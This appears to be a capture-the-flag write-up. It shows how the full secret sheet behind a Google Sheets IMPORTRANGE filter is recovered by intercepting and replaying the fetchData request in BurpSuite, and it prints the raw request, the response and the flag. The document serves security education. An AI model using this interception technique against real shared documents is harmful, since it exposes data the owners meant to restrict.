# digits-of-pi-2 (70 solves, 474 points)

## Description:
This [spreadsheet](https://docs.google.com/spreadsheets/d/1NX9nUMrpaxGqChQ7ROzITDtlxaz5McSsN5BMs-o5k-M/edit) is Secure™

## Solution:
In this challenge instead of the secret sheet being on the same Google Sheet, it is imported using the IMPORTRANGE function. 

![alt text](formula.png "Formula")

However, the entire sheet is imported and then filtered on the google Sheet we have access to. So we could intercept the request to get the entire secret sheet. I will use BurpSuite to do this.

Looking through the requests in the HTTP request history I saw this one which looked suspicious(the externalDataBatchRequest confirmed this)

```
POST /spreadsheets/d/1NX9nUMrpaxGqChQ7ROzITDtlxaz5McSsN5BMs-o5k-M/externaldata/fetchData?id=1NX9nUMrpaxGqChQ7ROzITDtlxaz5McSsN5BMs-o5k-M&sid=166fbbcbfe3b9199&vc=0&c=0&w=0&flr=0&smv=97&includes_info_params=true HTTP/2

Host: docs.google.com

...

externalDataBatchRequest=%7B%221%22%3A%5B%7B%221%22%3A%22customFunctionMap%22%2C%222%22%3A%22%22%7D%2C%7B%221%22%3A%22protectedRangeInfo%22%2C%222%22%3A%22%22%7D%2C%7B%221%22%3A%22dbExecutionInfo%22%2C%222%22%3A%22%22%7D%2C%7B%221%22%3A%22%7B1%3D4%2C7%3D%7B1%3D44%231MD4O3pFoQY59_YoW_ZzxRUg-rBgHFlAaYxnNABmqc3A%2C2%3D3%23A%3AZ%7D%7D%22%2C%222%22%3A%22%22%7D%5D%7D&esid=166fbbcbfe3b9199
```
Sending this the repeater tab and sending it, I got the following response with the flag:
```
HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

X-Robots-Tag: noindex, nofollow, nosnippet

X-Content-Type-Options: nosniff

Cache-Control: no-cache, no-store, max-age=0, must-revalidate

Pragma: no-cache

Expires: Mon, 01 Jan 1990 00:00:00 GMT

Date: Sun, 20 Jun 2021 03:24:00 GMT

X-Frame-Options: SAMEORIGIN

Content-Security-Policy: frame-ancestors 'self'

X-Xss-Protection: 1; mode=block

Server: GSE

Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000,h3-T051=":443"; ma=2592000,h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"



[null,[[null,"customFunctionMap",null,[null,null,null,null,""]],[null,"protectedRangeInfo","[]\n",[null,0.0,null,null,"d751713988987e9331980363e24189ce"]],[null,"dbExecutionInfo",null,[null,0.0,null,null,"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"]],[null,"{1\u003d4,7\u003d{1\u003d44#1MD4O3pFoQY59_YoW_ZzxRUg-rBgHFlAaYxnNABmqc3A,2\u003d3#A:Z}}","[null,1000,26,[[null,0,[[null,0,[null,[null,0]\n,[null,3,null,0]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,999440]\n]\n]\n,[null,2,[null,[null,0]\n,[null,2,\"Source:\"]\n]\n]\n]\n]\n,[null,1,[[null,0,[null,[null,0]\n,[null,3,null,1]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,999333]\n]\n]\n,[null,2,[null,[null,0]\n,[null,2,\"https://blogs.sas.com/content/iml/2015/03/12/digits-of-pi.html\"]\n,\"https://blogs.sas.com/content/iml/2015/03/12/digits-of-pi.html\"]\n]\n]\n]\n,[null,2,[[null,0,[null,[null,0]\n,[null,3,null,2]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,1000306]\n]\n]\n]\n]\n,[null,3,[[null,0,[null,[null,0]\n,[null,3,null,3]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,999964]\n]\n]\n]\n]\n,[null,4,[[null,0,[null,[null,0]\n,[null,3,null,4]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,1001093]\n]\n]\n]\n]\n,[null,5,[[null,0,[null,[null,0]\n,[null,3,null,5]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,1000466]\n]\n]\n]\n]\n,[null,6,[[null,0,[null,[null,0]\n,[null,3,null,6]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,999337]\n]\n]\n]\n]\n,[null,7,[[null,0,[null,[null,0]\n,[null,3,null,7]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,1000207]\n]\n]\n]\n]\n,[null,8,[[null,0,[null,[null,0]\n,[null,3,null,8]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,999814]\n]\n]\n]\n]\n,[null,9,[[null,0,[null,[null,0]\n,[null,3,null,9]\n]\n]\n,[null,1,[null,[null,0]\n,[null,3,null,1000040]\n]\n]\n]\n]\n,[null,36,[[null,14,[null,[null,0]\n,[null,2,\"m4k3_sur3_t0_r3str1ct_y0ur_imp0rtr4ng3s\"]\n]\n]\n]\n]\n]\n]\n",[null,1.624158716438E9,null,null,"�/�~�F��6\f�\f����",1.624156916287E9,null,null,[]]]]]
```
## Flag:
`
flag{m4k3_sur3_t0_r3str1ct_y0ur_imp0rtr4ng3s}`
